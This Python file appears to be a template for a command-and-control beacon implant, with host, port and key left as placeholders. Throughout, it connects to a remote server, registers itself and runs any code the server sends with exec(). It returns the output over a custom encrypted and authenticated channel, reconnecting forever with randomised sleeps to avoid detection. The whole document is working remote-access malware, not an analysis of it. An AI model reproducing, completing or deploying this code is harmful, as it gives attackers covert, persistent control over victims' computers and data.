import socket as sock, struct as st, zlib as zl, base64 as b64, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, secrets as sec, threading as thr, hashlib as hl, hmac as hmac_

MASTER_KEY = bytes({{XOR_KEY_BYTES}})
HOST = "{{HOST}}"
PORT = {{PORT}}
INTERVAL = {{INTERVAL}}
JITTER = {{JITTER}}
BEACON_ID = sec.token_hex(8)
BREAK_FLAG = False
CONN_KEY = MASTER_KEY

# connect_transport 传输钩子（U2/T6.2）: uplevel 升级代码可覆盖 _T/_H/_P/_K
def connect_transport():
    conn = sock.socket()
    conn.settimeout(30)
    conn.connect((HOST, PORT))
    return conn

def qround(state, x, y, z, w):
    state[x] = (state[x] + state[y]) & 0xffffffff
    state[w] = ((state[w] ^ state[x]) << 16 | (state[w] ^ state[x]) >> 16) & 0xffffffff
    state[z] = (state[z] + state[w]) & 0xffffffff
    state[y] = ((state[y] ^ state[z]) << 12 | (state[y] ^ state[z]) >> 20) & 0xffffffff
    state[x] = (state[x] + state[y]) & 0xffffffff
    state[w] = ((state[w] ^ state[x]) << 8 | (state[w] ^ state[x]) >> 24) & 0xffffffff
    state[z] = (state[z] + state[w]) & 0xffffffff
    state[y] = ((state[y] ^ state[z]) << 7 | (state[y] ^ state[z]) >> 25) & 0xffffffff

def block(key, nonce, counter):
    state = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574] + list(st.unpack("<8I", key)) + [counter] + list(st.unpack("<3I", nonce))
    work = state[:]
    for _ in range(10):
        qround(work, 0, 4, 8, 12); qround(work, 1, 5, 9, 13)
        qround(work, 2, 6, 10, 14); qround(work, 3, 7, 11, 15)
        qround(work, 0, 5, 10, 15); qround(work, 1, 6, 11, 12)
        qround(work, 2, 7, 8, 13); qround(work, 3, 4, 9, 14)
    return st.pack("<16I", *[(work[i] + state[i]) & 0xffffffff for i in range(16)])

def xor_stream(data, key, nonce):
    buf = bytearray()
    counter = 0
    for i in range(0, len(data), 64):
        buf += bytes(u ^ v for u, v in zip(data[i:i + 64], block(key, nonce, counter)))
        counter += 1
    return bytes(buf)

def encode_frame_(data):
    compressed = zl.compress(data)
    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
    nonce = sec.token_bytes(12)
    ciphertext = xor_stream(compressed, enc, nonce)
    return b64.b64encode(nonce + ciphertext + hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest())

def decode_frame_(data):
    blob = b64.b64decode(data)
    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
    nonce, ciphertext, tag = blob[:12], blob[12:-32], blob[-32:]
    if not hmac_.compare_digest(tag, hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()):
        raise ValueError("MAC")
    return zl.decompress(xor_stream(ciphertext, enc, nonce))

def send_frame(conn, data):
    encoded = encode_frame_(data)
    conn.sendall(st.pack(">I", len(encoded)) + encoded)

def recv_frame(conn):
    header = b""
    while 4 - len(header):
        chunk = conn.recv(4 - len(header))
        if not chunk:
            raise ConnectionError()
        header += chunk
    length = st.unpack(">I", header)[0]
    if length == 0:
        return b""
    payload = b""
    while length - len(payload):
        chunk = conn.recv(length - len(payload))
        if not chunk:
            raise ConnectionError()
        payload += chunk
    return decode_frame_(payload)

PRINT_LOCK = thr.Lock()

def exec_task(code):
    with PRINT_LOCK:
        buffers = io_.StringIO(), io_.StringIO()
        try:
            sy.stdout, sy.stderr = buffers
            exec(code, globals())
            return buffers[0].getvalue(), buffers[1].getvalue()
        except Exception:
            return buffers[0].getvalue(), buffers[1].getvalue() + tb.format_exc()
        finally:
            sy.stdout, sy.stderr = sy.__stdout__, sy.__stderr__

def sleep_jitter():
    return max(5, INTERVAL + rnd.uniform(-INTERVAL * JITTER, INTERVAL * JITTER))

def cycle():
    global CONN_KEY
    CONN_KEY = MASTER_KEY
    conn = None
    try:
        conn = connect_transport()
        send_frame(conn, js.dumps({"type": "register", "version": 1, "role": "beacon", "id": BEACON_ID}).encode())
        while True:
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "welcome":
                continue
            if mtype in ("task", "init_task"):
                out, err = exec_task(msg["code"])
                send_frame(conn, js.dumps({"type": "result", "task_id": msg.get("task_id", ""), "output": out, "error": err}).encode())
            elif mtype == "pong":
                break
            elif mtype == "error":
                break
    except Exception:
        pass
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass

while True:
    if BREAK_FLAG:
        break
    cycle()
    tm.sleep(sleep_jitter())
